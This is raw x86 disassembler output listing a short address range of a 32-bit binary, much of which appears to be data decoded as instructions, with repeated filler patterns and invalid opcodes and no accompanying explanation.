  41a452:	mov    DWORD PTR [eax-0x2b],eax
  41a455:	mov    ebx,0x4cfdccc0
  41a45a:	int3   
  41a45b:	int3   
  41a45c:	ins    BYTE PTR es:[edi],dx
  41a45d:	mov    esp,ebp
  41a45f:	push   ebx
  41a460:	addr16 mov ch,0x88
  41a463:	cmp    eax,0x3eb399
  41a468:	ret    0xebfb
  41a46b:	push   ebp
  41a46c:	clc    
  41a46d:	dec    DWORD PTR [eax+0x3eb38135]
  41a473:	add    dh,dh
  41a475:	mov    ebp,0x5d58
	...
  41a48a:	add    BYTE PTR [eax],al
  41a48c:	jp     0x41a4da
  41a48e:	int3   
  41a48f:	int3   
  41a490:	in     al,dx
  41a491:	mov    ah,ch
  41a493:	push   ecx
  41a494:	adc    esp,eax
  41a496:	add    BYTE PTR [eax+0x39],al
  41a499:	lahf   
  41a49a:	cld    
  41a49b:	push   ebp
  41a49c:	clc    
  41a49d:	dec    DWORD PTR [edi-0x18]
  41a4a0:	xchg   ebp,eax
  41a4a1:	pop    eax
  41a4a2:	std    
  41a4a3:	(bad)  
  41a4a4:	mov    edx,0xfc890844
  41a4a9:	pop    ebx
  41a4aa:	mov    DWORD PTR [ebp+0x41],ecx
  41a4ad:	scas   eax,DWORD PTR es:[edi]
  41a4ae:	imul   eax,DWORD PTR [eax],0x5617f3b2
  41a4b4:	clc    
  41a4b5:	call   DWORD PTR [ecx-0x1]
  41a4b8:	mov    WORD PTR [ecx+ecx*4-0x1b],ds
  41a4bc:	mov    WORD PTR [ecx-0x34],es
  41a4bf:	int3   
  41a4c0:	mov    WORD PTR [ecx+0x240d83ec],cs
  41a4c6:	lds    eax,FWORD PTR [ebp+0x11]
  41a4c9:	add    BYTE PTR [eax],al
  41a4cb:	add    BYTE PTR [ecx],bh
  41a4cd:	inc    ebp
  41a4ce:	inc    ebx
  41a4cf:	fadd   QWORD PTR [ecx-0xa000000]
  41a4d5:	ret    0x1f3
  41a4d8:	cmp    DWORD PTR [eax],eax
  41a4da:	add    bh,al
  41a4dc:	je     0x41a53a
  41a4de:	add    BYTE PTR [eax],al
  41a4e0:	cmp    DWORD PTR [eax],eax
  41a4e2:	lds    eax,FWORD PTR [ebp-0x2b]
  41a4e5:	(bad)  
  41a4e6:	(bad)  
  41a4e7:	(bad)  
  41a4e8:	cmp    DWORD PTR [ecx+0xac0084b],ecx
  41a4ee:	lock push ebp
	...
  41a504:	js     0x41a506
  41a506:	call   0xfd9e6bb4
  41a50b:	mov    eax,ds:0x3eb2a9
  41a510:	push   esp
  41a511:	pop    ebp
  41a512:	std    
  41a513:	add    BYTE PTR [ecx],bh
  41a515:	aam    0xb
  41a517:	(bad)  
  41a518:	xor    al,0x58
  41a51a:	push   ebx
  41a51b:	inc    ecx
  41a51c:	cmp    DWORD PTR [eax],eax
  41a51e:	add    BYTE PTR [eax],al
  41a520:	cmp    DWORD PTR [ecx+0xa],ebp
  41a523:	(bad)  
  41a524:	cmp    al,0x58
  41a526:	push   ebx
  41a527:	inc    ecx
  41a528:	cmp    edi,edi
  41a52a:	(bad)  
  41a52b:	(bad)  
  41a52c:	cmp    DWORD PTR [ecx-0x40fb0fc5],eax
  41a532:	(bad)  
  41a533:	(bad)  
  41a534:	in     al,dx
  41a535:	or     ebp,eax
  41a537:	add    eax,0x3eb261
  41a53c:	cmp    DWORD PTR [eax],eax
  41a53e:	add    BYTE PTR [eax],al
  41a540:	mov    edx,0xf855f81a
  41a545:	(bad)  
  41a546:	push   DWORD PTR [esp+ebp*1-0x16]
  41a54a:	(bad)  
  41a54b:	dec    BYTE PTR [eax+eax*2+0x53]
  41a54f:	inc    ecx
  41a550:	cmp    DWORD PTR [edi+0x7855f0],ebx
  41a556:	mov    DWORD PTR ds:0x3eb629,ecx
  41a55c:	ror    ch,0xe7
  41a55f:	mov    esp,DWORD PTR [eax+edx*2]
  41a562:	push   ebx
  41a563:	inc    ecx
  41a564:	cmp    DWORD PTR [edi+0xe843],eax
	...
  41a57a:	add    BYTE PTR [eax],al
  41a57c:	cmp    bh,BYTE PTR [esi+0x687c893b]
  41a582:	mov    DWORD PTR [ebp-0x1f],ecx
  41a585:	mov    DWORD PTR [ebx],ecx
  41a587:	fmul   QWORD PTR [ecx+eax*8-0x769801]
  41a58e:	aas    
  41a58f:	add    dh,dl
  41a591:	cmc    
  41a592:	mov    edi,0xa1007855
  41a597:	cld    
  41a598:	ins    BYTE PTR es:[edi],dx
  41a599:	sar    edi,0xc6
  41a59c:	xor    al,0xc
  41a59e:	push   esi
  41a59f:	inc    ecx
  41a5a0:	cmp    ebp,edx
  41a5a2:	add    BYTE PTR [eax+0x39],al
  41a5a5:	call   0x3aa909
  41a5aa:	mov    BYTE PTR ds:0x3eb59d,dl
  41a5b0:	jmp    0x41a619
  41a5b2:	ret    0x8ef7
  41a5b5:	pop    ebx
  41a5b6:	add    esp,0x56089f31
  41a5bc:	clc    
  41a5bd:	(bad)  
  41a5be:	cld    
  41a5bf:	adc    eax,0x3eb241
  41a5c4:	call   0xca1:0x394155f8
  41a5cb:	push   esi
  41a5cc:	clc    
  41a5cd:	dec    DWORD PTR [edi-0x18]
  41a5d0:	lea    ebx,[edx-0x3]
  41a5d3:	(bad)  
  41a5d4:	mov    edx,0xfc890444
  41a5d9:	dec    edi
  41a5da:	mov    DWORD PTR [ebp+0x49],ecx
  41a5dd:	mov    cl,0xe7
  41a5df:	aad    0x0
	...
  41a5f1:	add    BYTE PTR [eax],al
  41a5f3:	add    BYTE PTR [edi],dh
  41a5f5:	pop    ebx
  41a5f6:	std    
  41a5f7:	xor    ebp,0x3
  41a5fa:	mov    eax,ds:0xffc18cf4
  41a5ff:	mov    al,BYTE PTR [eax+edx*2-0x5ec695ae]
  41a606:	hlt    
  41a607:	push   ebp
  41a608:	js     0x41a60a
  41a60a:	push   eax
  41a60b:	call   0x3ef8b5
  41a610:	mov    edx,0x848b0c43
  41a615:	push   eax
  41a616:	xchg   DWORD PTR [ebp-0x27],ecx
  41a619:	xchg   BYTE PTR [ebx-0x4],dl
  41a61c:	and    dh,BYTE PTR [ebp-0x787c8c11]
  41a622:	inc    ebx
  41a623:	loopne 0x41a68e
  41a625:	xchg   DWORD PTR [ebx-0x24],ecx
  41a628:	push   0xc6fbae68
  41a62d:	pop    edx
  41a62e:	add    esp,0x56009f31
  41a634:	clc    
  41a635:	dec    DWORD PTR [eax+0x3eb23915]
  41a63b:	add    BYTE PTR [ebx],cl
  41a63d:	mov    eax,ds:0xfff8560c
  41a642:	add    BYTE PTR [ebp-0x63],al
  41a645:	scas   eax,DWORD PTR es:[edi]
  41a646:	mov    BYTE PTR ds:0x3eb485,cl
  41a64c:	cmp    cl,ch
  41a64e:	sti    
  41a64f:	push   ecx
  41a650:	xchg   ecx,eax
  41a651:	xor    dh,bh
  41a653:	push   DWORD PTR [esi+0x7e]
  41a656:	les    ecx,FWORD PTR [eax+eax*1]
	...
  41a669:	add    BYTE PTR [eax],al
  41a66b:	add    dl,al
  41a66d:	mov    ah,0xf3
  41a66f:	add    ecx,DWORD PTR [esp+edi*1]
  41a672:	add    DWORD PTR [ebp+0x55],edx
  41a675:	mov    BYTE PTR [ebx-0x1c],dl
  41a678:	ret    0xfbc4
  41a67b:	add    esi,esp
  41a67d:	cmp    eax,DWORD PTR [edi+0x4b864545]
  41a683:	loopne 0x41a697
  41a685:	or     eax,0x785600
  41a68a:	xchg   DWORD PTR [ebp+0x19],ecx
  41a68d:	data16 sahf 
  41a68f:	(bad)  
  41a690:	jl     0x41a6ea
  41a692:	add    BYTE PTR [eax],al
  41a694:	cmp    DWORD PTR [eax],eax
  41a696:	jmp    0xf7f568a4
  41a69b:	cmp    ebx,0x4
  41a69e:	xchg   DWORD PTR [ebp+0x1],edx
  41a6a1:	xchg   BYTE PTR [ebx-0x8],al
  41a6a4:	inc    edx
  41a6a5:	ret    
  41a6a6:	out    dx,eax
  41a6a7:	jae    0x41a6da
  41a6a9:	test   DWORD PTR [ebx],ecx
  41a6ab:	hlt    
  41a6ac:	test   BYTE PTR [edi+0x587402ff],bh
  41a6b2:	mov    DWORD PTR [ecx],edx
  41a6b4:	cmp    dh,BYTE PTR [ebx-0x4c325e09]
  41a6ba:	add    BYTE PTR ds:[edx],bh
  41a6bd:	ret    
  41a6be:	test   DWORD PTR [ecx-0x7b47ad7],0x3e73fb8
  41a6c8:	cmp    DWORD PTR [eax],eax
  41a6ca:	mov    DWORD PTR ds:0x3eb3a5,edx
	...
  41a6e4:	cmp    dh,BYTE PTR [ebx-0x60cccc09]
  41a6ea:	hlt    
  41a6eb:	push   ebp
  41a6ec:	clc    
  41a6ed:	inc    DWORD PTR [eax]
  41a6ef:	inc    ebp
  41a6f0:	xchg   ecx,eax
  41a6f1:	xchg   DWORD PTR [eax],ecx
  41a6f3:	jmp    0x41a6c3
  41a6f5:	xchg   DWORD PTR [ebx],ebp
  41a6f7:	in     al,0xe4
  41a6f9:	mov    esi,0x603488ff
  41a6fe:	push   ebx
  41a6ff:	inc    ecx
  41a700:	cmp    DWORD PTR ds:0x382c89c7,ecx
  41a706:	push   ebx
  41a707:	inc    ecx
  41a708:	cmp    DWORD PTR ds:0x6c3489c7,ecx
  41a70e:	push   ebx
  41a70f:	inc    ecx
  41a710:	cmp    DWORD PTR [eax+0x4e],ebp
  41a713:	test   DWORD PTR [esi+0x59],0xb2ce0d8b
  41a71a:	ds add al,al
  41a71d:	retf   0xb9f7
  41a720:	cmp    esi,edi
  41a722:	aas    
  41a723:	add    BYTE PTR [eax+0x39020066],bh
  41a729:	add    BYTE PTR [ecx-0x30daeeab],cl
  41a72f:	mov    DWORD PTR [eax+ebp*2],esp
  41a732:	push   ebx
  41a733:	inc    ecx
  41a734:	cmp    DWORD PTR [edi+0x7855e8],ebx
  41a73a:	push   eax
  41a73b:	call   0x3efd7d
  41a740:	mov    edx,0x348b0443
  41a745:	push   esp
  41a746:	push   ebx
  41a747:	inc    ecx
	...
  41a75c:	cmp    DWORD PTR [edi+0x58d3d5e7],ebp
  41a762:	std    
  41a763:	test   ecx,edi
  41a765:	rol    BYTE PTR [ebx],cl
  41a767:	xor    edi,ecx
  41a769:	sub    cl,BYTE PTR fs:[ebx+0x41536414]
  41a770:	cmp    DWORD PTR [ebp-0x3c],edi
  41a773:	add    al,0xba
  41a775:	sbb    bh,al
  41a777:	push   ebp
  41a778:	clc    
  41a779:	(bad)  
  41a77a:	push   DWORD PTR [ebx+0x30]
  41a77d:	lahf   
  41a77e:	aam    0x55
  41a780:	clc    
  41a781:	inc    DWORD PTR [esi-0x17fbaabc]
  41a787:	pop    ebp
  41a788:	test   BYTE PTR [eax-0x3],bl
  41a78b:	mov    esp,DWORD PTR [esp+esi*8]
  41a78e:	push   ebp
  41a78f:	inc    ecx
  41a790:	cmp    DWORD PTR [esi-0x7b86cc40],ebp
  41a796:	jecxz  0x41a7f5
  41a798:	jp     0x41a7e5
  41a79a:	int3   
  41a79b:	int3   
  41a79c:	cmp    DWORD PTR [eax],eax
  41a79e:	add    BYTE PTR [eax],al
  41a7a0:	cmp    DWORD PTR [eax],eax
  41a7a2:	add    BYTE PTR [eax],al
  41a7a4:	cmp    DWORD PTR [eax],eax
  41a7a6:	add    BYTE PTR [eax],al
  41a7a8:	cmp    DWORD PTR [eax],eax
  41a7aa:	add    BYTE PTR [eax],al
  41a7ac:	cmp    DWORD PTR [eax],eax
  41a7ae:	add    BYTE PTR [eax],al
  41a7b0:	cmp    DWORD PTR [eax],eax
  41a7b2:	add    BYTE PTR [eax],al
  41a7b4:	cmp    DWORD PTR [eax],eax
  41a7b6:	add    BYTE PTR [eax],al
  41a7b8:	cmp    DWORD PTR [eax],eax
  41a7ba:	add    BYTE PTR [eax],al
  41a7bc:	cmp    DWORD PTR [eax],eax
	...
  41a7d2:	add    BYTE PTR [eax],al
  41a7d4:	cmp    DWORD PTR [eax],eax
  41a7d6:	add    BYTE PTR [eax],al
  41a7d8:	cmp    DWORD PTR [eax],eax
  41a7da:	add    BYTE PTR [eax],al
  41a7dc:	cmp    DWORD PTR [eax],eax
  41a7de:	add    BYTE PTR [eax],al
  41a7e0:	cmp    DWORD PTR [eax],eax
  41a7e2:	add    BYTE PTR [eax],al
  41a7e4:	cmp    DWORD PTR [eax],eax
  41a7e6:	add    BYTE PTR [eax],al
  41a7e8:	cmp    DWORD PTR [eax],eax
  41a7ea:	add    BYTE PTR [eax],al
  41a7ec:	cmp    DWORD PTR [eax],eax
  41a7ee:	add    BYTE PTR [eax],al
  41a7f0:	cmp    DWORD PTR [eax],eax
  41a7f2:	add    BYTE PTR [eax],al
  41a7f4:	cmp    DWORD PTR [eax],eax
  41a7f6:	add    BYTE PTR [eax],al
  41a7f8:	cmp    DWORD PTR [eax],eax
  41a7fa:	add    BYTE PTR [eax],al
  41a7fc:	cmp    DWORD PTR [eax],eax
  41a7fe:	add    BYTE PTR [eax],al
  41a800:	cmp    DWORD PTR [eax],eax
  41a802:	add    BYTE PTR [eax],al
  41a804:	cmp    DWORD PTR [eax],eax
  41a806:	add    BYTE PTR [eax],al
  41a808:	cmp    DWORD PTR [eax],eax
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	cmp    DWORD PTR [eax],eax
  41a80e:	add    BYTE PTR [eax],al
  41a810:	cmp    DWORD PTR [eax],eax
  41a812:	add    BYTE PTR [eax],al
  41a814:	cmp    DWORD PTR [eax],eax
  41a816:	add    BYTE PTR [eax],al
  41a818:	cmp    DWORD PTR [eax],eax
  41a81a:	add    BYTE PTR [eax],al
  41a81c:	cmp    DWORD PTR [eax],eax
  41a81e:	add    BYTE PTR [eax],al
  41a820:	cmp    DWORD PTR [eax],eax
  41a822:	add    BYTE PTR [eax],al
  41a824:	cmp    DWORD PTR [eax],eax
  41a826:	add    BYTE PTR [eax],al
  41a828:	cmp    DWORD PTR [eax],eax
  41a82a:	add    BYTE PTR [eax],al
  41a82c:	cmp    DWORD PTR [eax],eax
  41a82e:	add    BYTE PTR [eax],al
  41a830:	cmp    DWORD PTR [eax],eax
  41a832:	add    BYTE PTR [eax],al
  41a834:	cmp    DWORD PTR [eax],eax
	...
  41a84a:	add    BYTE PTR [eax],al
  41a84c:	cmp    DWORD PTR [eax],eax
  41a84e:	add    BYTE PTR [eax],al
  41a850:	cmp    DWORD PTR [eax],eax
  41a852:	add    BYTE PTR [eax],al
  41a854:	cmp    DWORD PTR [eax],eax
  41a856:	add    BYTE PTR [eax],al
  41a858:	cmp    DWORD PTR [eax],eax
  41a85a:	add    BYTE PTR [eax],al
  41a85c:	cmp    DWORD PTR [eax],eax
  41a85e:	add    BYTE PTR [eax],al
  41a860:	cmp    DWORD PTR [eax],eax
  41a862:	add    BYTE PTR [eax],al
  41a864:	cmp    DWORD PTR [eax],eax
  41a866:	add    BYTE PTR [eax],al
  41a868:	cmp    DWORD PTR [eax],eax
  41a86a:	add    BYTE PTR [eax],al
  41a86c:	cmp    DWORD PTR [eax],eax
  41a86e:	add    BYTE PTR [eax],al
  41a870:	cmp    DWORD PTR [eax],eax
  41a872:	add    BYTE PTR [eax],al
  41a874:	cmp    DWORD PTR [eax],eax
  41a876:	add    BYTE PTR [eax],al
  41a878:	cmp    DWORD PTR [eax],eax
  41a87a:	add    BYTE PTR [eax],al
  41a87c:	cmp    DWORD PTR [eax],eax
  41a87e:	add    BYTE PTR [eax],al
  41a880:	cmp    DWORD PTR [eax],eax
  41a882:	add    BYTE PTR [eax],al
  41a884:	cmp    DWORD PTR [eax],eax
  41a886:	add    BYTE PTR [eax],al
  41a888:	cmp    DWORD PTR [eax],eax
  41a88a:	add    BYTE PTR [eax],al
  41a88c:	cmp    DWORD PTR [eax],eax
  41a88e:	add    BYTE PTR [eax],al
  41a890:	cmp    DWORD PTR [eax],eax
  41a892:	add    BYTE PTR [eax],al
  41a894:	cmp    DWORD PTR [eax],eax
  41a896:	add    BYTE PTR [eax],al
  41a898:	cmp    DWORD PTR [eax],eax
  41a89a:	add    BYTE PTR [eax],al
  41a89c:	cmp    DWORD PTR [eax],eax
  41a89e:	add    BYTE PTR [eax],al
  41a8a0:	cmp    DWORD PTR [eax],eax
  41a8a2:	add    BYTE PTR [eax],al
  41a8a4:	cmp    DWORD PTR [eax],eax
  41a8a6:	add    BYTE PTR [eax],al
  41a8a8:	cmp    DWORD PTR [eax],eax
  41a8aa:	add    BYTE PTR [eax],al
  41a8ac:	cmp    DWORD PTR [eax],eax
	...
  41a8c2:	add    BYTE PTR [eax],al
  41a8c4:	cmp    DWORD PTR [eax],eax
  41a8c6:	add    BYTE PTR [eax],al
  41a8c8:	cmp    DWORD PTR [eax],eax
  41a8ca:	add    BYTE PTR [eax],al
  41a8cc:	cmp    DWORD PTR [eax],eax
  41a8ce:	add    BYTE PTR [eax],al
  41a8d0:	cmp    DWORD PTR [eax],eax
  41a8d2:	add    BYTE PTR [eax],al
  41a8d4:	cmp    DWORD PTR [eax],eax
  41a8d6:	add    BYTE PTR [eax],al
  41a8d8:	cmp    DWORD PTR [eax],eax
  41a8da:	add    BYTE PTR [eax],al
  41a8dc:	cmp    DWORD PTR [eax],eax
  41a8de:	add    BYTE PTR [eax],al
  41a8e0:	cmp    DWORD PTR [eax],eax
  41a8e2:	add    BYTE PTR [eax],al
  41a8e4:	cmp    DWORD PTR [eax],eax
  41a8e6:	add    BYTE PTR [eax],al
  41a8e8:	cmp    DWORD PTR [eax],eax
  41a8ea:	add    BYTE PTR [eax],al
  41a8ec:	cmp    DWORD PTR [eax],eax
  41a8ee:	add    BYTE PTR [eax],al
  41a8f0:	cmp    DWORD PTR [eax],eax
  41a8f2:	add    BYTE PTR [eax],al
  41a8f4:	cmp    DWORD PTR [eax],eax
  41a8f6:	add    BYTE PTR [eax],al
  41a8f8:	cmp    DWORD PTR [eax],eax
  41a8fa:	add    BYTE PTR [eax],al
  41a8fc:	cmp    DWORD PTR [eax],eax
  41a8fe:	add    BYTE PTR [eax],al
  41a900:	cmp    DWORD PTR [eax],eax
  41a902:	add    BYTE PTR [eax],al
  41a904:	cmp    DWORD PTR [eax],eax
  41a906:	add    BYTE PTR [eax],al
  41a908:	cmp    DWORD PTR [eax],eax
  41a90a:	add    BYTE PTR [eax],al
  41a90c:	cmp    DWORD PTR [eax],eax
  41a90e:	add    BYTE PTR [eax],al
  41a910:	cmp    DWORD PTR [eax],eax
  41a912:	add    BYTE PTR [eax],al
  41a914:	cmp    DWORD PTR [eax],eax
  41a916:	add    BYTE PTR [eax],al
  41a918:	cmp    DWORD PTR [eax],eax
  41a91a:	add    BYTE PTR [eax],al
  41a91c:	cmp    DWORD PTR [eax],eax
  41a91e:	add    BYTE PTR [eax],al
  41a920:	cmp    DWORD PTR [eax],eax
  41a922:	add    BYTE PTR [eax],al
  41a924:	add    BYTE PTR [edx],al
  41a926:	add    BYTE PTR [eax],al
  41a928:	cmp    DWORD PTR [eax],eax
  41a92a:	add    BYTE PTR [eax],al
  41a92c:	and    DWORD PTR [eax],eax
  41a92e:	add    BYTE PTR [eax],al
  41a930:	lds    esi,FWORD PTR [edx]
  41a932:	nop
  41a933:	xor    al,ch
  41a935:	xor    bl,BYTE PTR [eax-0x5fcd3ace]
  41a93b:	xor    dl,ch
  41a93d:	xor    ch,BYTE PTR [eax+0x1403932]
  41a943:	add    cl,ch
  41a945:	(bad)  
  41a946:	(bad)  
  41a947:	call   FWORD PTR [edx-0x16c4b4c6]
  41a94d:	cmp    bl,BYTE PTR [edx+0x3b]
  41a950:	push   ss
  41a951:	cmp    ebp,DWORD PTR [eax+0x3b]
  41a954:	fistp  QWORD PTR [edx]
  41a956:	xchg   ebx,eax
  41a957:	cmp    eax,edi
  41a959:	cmp    ebp,DWORD PTR [eax-0x12c48ac5]
  41a95f:	cmp    eax,DWORD PTR [edx+0x3c]
  41a962:	adc    DWORD PTR [eax+esi*1],edi
  41a965:	cmp    al,0x9d
  41a967:	cmp    al,0x9d
  41a969:	cmp    eax,0x3eac3e87
  41a96e:	xchg   ebp,eax
  41a96f:	ds std 
  41a971:	cmp    eax,0x3e163ecd
  41a976:	jle    0x41a9b7
  41a978:	mov    edx,0xd03f9b3e
  41a97d:	ds scas eax,DWORD PTR es:[edi]
  41a97f:	aas    
  41a980:	(bad)  
  41a981:	ds int3 
  41a983:	aas    
  41a984:	jmp    0x41a9c4
  41a986:	out    0x3f,al
  41a988:	or     BYTE PTR [edi],bh
  41a98a:	stc    
  41a98b:	aas    
	...
  41a9a0:	(bad)  
  41a9a1:	add    BYTE PTR ds:[eax],al
  41a9a4:	cmp    DWORD PTR [eax+0x1],edx
  41a9a7:	add    BYTE PTR [ebp+0x3cffffff],ah
  41a9ad:	xor    BYTE PTR [eax],bl
  41a9af:	xor    BYTE PTR [eax+0x7f30872f],bh
  41a9b5:	xor    DWORD PTR [ebx+0x31],ecx
  41a9b8:	ins    BYTE PTR es:[edi],dx
  41a9b9:	xor    DWORD PTR [esi+0x31],esp
  41a9bc:	dec    ecx
  41a9bd:	xor    DWORD PTR [ebp-0x55cf6acf],ecx
  41a9c3:	xor    DWORD PTR [ebx+0x30],edi
  41a9c6:	in     eax,0x31
  41a9c8:	dec    eax
  41a9c9:	xor    bl,BYTE PTR [ecx]
  41a9cb:	xor    al,BYTE PTR [esi+0x32]
  41a9ce:	xor    bl,BYTE PTR es:[ebp+0x32]
  41a9d2:	inc    ebp
  41a9d3:	xor    al,BYTE PTR [edx]
  41a9d5:	xor    dl,BYTE PTR [ebx+0x32]
  41a9d8:	repz xor DWORD PTR [ecx+0x32],esp
  41a9dc:	push   ss
  41a9dd:	xor    bh,BYTE PTR [edi+0x32]
  41a9e0:	mov    ah,0x31
  41a9e2:	xchg   edi,eax
  41a9e3:	xor    bl,BYTE PTR [eax-0x4fcd54cf]
  41a9e9:	xor    ebx,eax
  41a9eb:	xor    cl,BYTE PTR [eax+0x2f330831]
  41a9f1:	xor    edx,DWORD PTR [ebx+esi*1]
  41a9f4:	sbb    al,0x33
  41a9f6:	sub    dh,BYTE PTR [ebx]
  41a9f8:	sti    
  41a9f9:	xor    bh,BYTE PTR [esi+0x33]
  41a9fc:	mov    cl,0x32
  41a9fe:	xchg   ebp,eax
  41a9ff:	xor    ebx,DWORD PTR [eax+0x33ab32]
	...
  41aa15:	add    BYTE PTR [eax],al
  41aa17:	add    ch,ch
  41aa19:	xor    DWORD PTR [esi-0x31cdffcd],edi
  41aa1f:	xor    ecx,DWORD PTR ds:0xe33dd32
  41aa25:	xor    dh,ah
  41aa27:	xor    edx,DWORD PTR [ebx]
  41aa29:	xor    bh,bh
  41aa2b:	xor    esi,DWORD PTR [esp+esi*1]
  41aa2e:	or     DWORD PTR [edi+esi*1],esi
  41aa31:	xor    al,0x14
  41aa33:	xor    al,0x5b
  41aa35:	xor    al,0x28
  41aa37:	xor    al,0x24
  41aa39:	xor    al,0x32
  41aa3b:	xor    al,0x7e
  41aa3d:	xor    al,0x5a
  41aa3f:	xor    al,0xbf
  41aa41:	xor    al,0x8c
  41aa43:	xor    al,0xcb
  41aa45:	xor    al,0x9c
  41aa47:	xor    al,0xff
  41aa49:	xor    al,0xeb
  41aa4b:	xor    al,0xd1
  41aa4d:	xor    al,0xc
  41aa4f:	xor    eax,0x3523332f
  41aa54:	adc    BYTE PTR [ebx],dh
  41aa56:	xor    DWORD PTR ds:0x35443370,esi
  41aa5c:	std    
  41aa5d:	xor    bl,BYTE PTR [ebp+0x35]
  41aa60:	sbb    esi,DWORD PTR [ebx]
  41aa62:	jno    0x41aa99
  41aa64:	mov    ah,0x33
  41aa66:	mov    ?,WORD PTR ds:0x35a533af
  41aa6c:	cmp    DWORD PTR [eax],eax
  41aa6e:	add    BYTE PTR [eax],al
  41aa70:	cmp    DWORD PTR [eax],eax
  41aa72:	add    BYTE PTR [eax],al
  41aa74:	cmp    DWORD PTR [eax],eax
  41aa76:	add    BYTE PTR [eax],al
  41aa78:	cmp    DWORD PTR [eax],eax
	...
  41aa8e:	add    BYTE PTR [eax],al
  41aa90:	cmp    DWORD PTR [eax],eax
  41aa92:	add    BYTE PTR [eax],al
  41aa94:	cmp    DWORD PTR [eax],eax
  41aa96:	add    BYTE PTR [eax],al
  41aa98:	cmp    DWORD PTR [eax],eax
  41aa9a:	add    BYTE PTR [eax],al
  41aa9c:	cmp    DWORD PTR [eax],eax
  41aa9e:	add    BYTE PTR [eax],al
  41aaa0:	cmp    DWORD PTR [eax],eax
  41aaa2:	add    BYTE PTR [eax],al
  41aaa4:	cmp    DWORD PTR [eax],eax
  41aaa6:	add    BYTE PTR [eax],al
  41aaa8:	cmp    DWORD PTR [eax],eax
  41aaaa:	add    BYTE PTR [eax],al
  41aaac:	cmp    DWORD PTR [eax],eax
  41aaae:	add    BYTE PTR [eax],al
  41aab0:	cmp    DWORD PTR [eax],eax
  41aab2:	add    BYTE PTR [eax],al
  41aab4:	cmp    DWORD PTR [eax],eax
  41aab6:	add    BYTE PTR [eax],al
  41aab8:	cmp    DWORD PTR [eax],eax
  41aaba:	add    BYTE PTR [eax],al
  41aabc:	cmp    DWORD PTR [eax],eax
  41aabe:	add    BYTE PTR [eax],al
  41aac0:	cmp    DWORD PTR [eax],eax
  41aac2:	add    BYTE PTR [eax],al
  41aac4:	cmp    DWORD PTR [eax],eax
  41aac6:	add    BYTE PTR [eax],al
  41aac8:	cmp    DWORD PTR [eax],eax
  41aaca:	add    BYTE PTR [eax],al
  41aacc:	cmp    DWORD PTR [eax],eax
  41aace:	add    BYTE PTR [eax],al
  41aad0:	cmp    DWORD PTR [eax],eax
  41aad2:	add    BYTE PTR [eax],al
  41aad4:	cmp    DWORD PTR [eax],eax
  41aad6:	add    BYTE PTR [eax],al
  41aad8:	cmp    DWORD PTR [eax],eax
  41aada:	add    BYTE PTR [eax],al
  41aadc:	cmp    DWORD PTR [eax],eax
  41aade:	add    BYTE PTR [eax],al
  41aae0:	cmp    DWORD PTR [eax],eax
  41aae2:	add    BYTE PTR [eax],al
  41aae4:	cmp    DWORD PTR [eax],eax
  41aae6:	add    BYTE PTR [eax],al
  41aae8:	cmp    DWORD PTR [eax],eax
  41aaea:	add    BYTE PTR [eax],al
  41aaec:	cmp    DWORD PTR [eax],eax
  41aaee:	add    BYTE PTR [eax],al
  41aaf0:	cmp    DWORD PTR [eax],eax
	...
  41ab06:	add    BYTE PTR [eax],al
  41ab08:	cmp    DWORD PTR [eax],eax
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	cmp    DWORD PTR [eax],eax
  41ab0e:	add    BYTE PTR [eax],al
  41ab10:	cmp    DWORD PTR [eax],eax
  41ab12:	add    BYTE PTR [eax],al
  41ab14:	cmp    DWORD PTR [eax],eax
  41ab16:	add    BYTE PTR [eax],al
  41ab18:	cmp    DWORD PTR [eax],eax
  41ab1a:	add    BYTE PTR [eax],al
  41ab1c:	cmp    DWORD PTR [eax],eax
  41ab1e:	add    BYTE PTR [eax],al
  41ab20:	cmp    DWORD PTR [eax],eax
  41ab22:	add    BYTE PTR [eax],al
  41ab24:	cmp    DWORD PTR [eax],eax
  41ab26:	add    BYTE PTR [eax],al
  41ab28:	cmp    DWORD PTR [eax],eax
  41ab2a:	add    BYTE PTR [eax],al
  41ab2c:	cmp    DWORD PTR [eax],eax
  41ab2e:	add    BYTE PTR [eax],al
  41ab30:	cmp    DWORD PTR [eax],eax
  41ab32:	add    BYTE PTR [eax],al
  41ab34:	cmp    DWORD PTR [eax],eax
  41ab36:	add    BYTE PTR [eax],al
  41ab38:	cmp    DWORD PTR [eax],eax
  41ab3a:	add    BYTE PTR [eax],al
  41ab3c:	cmp    DWORD PTR [eax],eax
  41ab3e:	add    BYTE PTR [eax],al
  41ab40:	cmp    DWORD PTR [eax],eax
  41ab42:	add    BYTE PTR [eax],al
  41ab44:	cmp    DWORD PTR [eax],eax
  41ab46:	add    BYTE PTR [eax],al
  41ab48:	cmp    DWORD PTR [eax],eax
  41ab4a:	add    BYTE PTR [eax],al
  41ab4c:	cmp    DWORD PTR [eax],eax
  41ab4e:	add    BYTE PTR [eax],al
  41ab50:	cmp    DWORD PTR [eax],eax
  41ab52:	add    BYTE PTR [eax],al
  41ab54:	cmp    DWORD PTR [eax],eax
  41ab56:	add    BYTE PTR [eax],al
  41ab58:	cmp    DWORD PTR [eax],eax
  41ab5a:	add    BYTE PTR [eax],al
  41ab5c:	cmp    DWORD PTR [eax],eax
  41ab5e:	add    BYTE PTR [eax],al
  41ab60:	cmp    DWORD PTR [eax],eax
  41ab62:	add    BYTE PTR [eax],al
  41ab64:	cmp    DWORD PTR [eax],eax
  41ab66:	add    BYTE PTR [eax],al
  41ab68:	cmp    DWORD PTR [eax],eax
	...
  41ab7e:	add    BYTE PTR [eax],al
  41ab80:	cmp    DWORD PTR [eax],eax
  41ab82:	add    BYTE PTR [eax],al
  41ab84:	cmp    DWORD PTR [eax],eax
  41ab86:	add    BYTE PTR [eax],al
  41ab88:	cmp    DWORD PTR [eax],eax
  41ab8a:	add    BYTE PTR [eax],al
  41ab8c:	fs in  al,dx
  41ab8e:	inc    ecx
  41ab8f:	add    BYTE PTR [eax-0x14],ch
  41ab92:	inc    ecx
  41ab93:	add    BYTE PTR [esp+ebp*8+0x41],ch
  41ab97:	add    BYTE PTR [eax-0x14],dh
  41ab9a:	inc    ecx
  41ab9b:	add    BYTE PTR [esp+ebp*8+0x41],dh
  41ab9f:	add    BYTE PTR [eax-0x14],bh
  41aba2:	inc    ecx
  41aba3:	add    BYTE PTR [esp+ebp*8+0x41],bh
  41aba7:	add    BYTE PTR [eax-0x7bffbe14],al
  41abad:	in     al,dx
  41abae:	inc    ecx
  41abaf:	add    BYTE PTR [eax-0x73ffbe14],cl
  41abb5:	in     al,dx
  41abb6:	inc    ecx
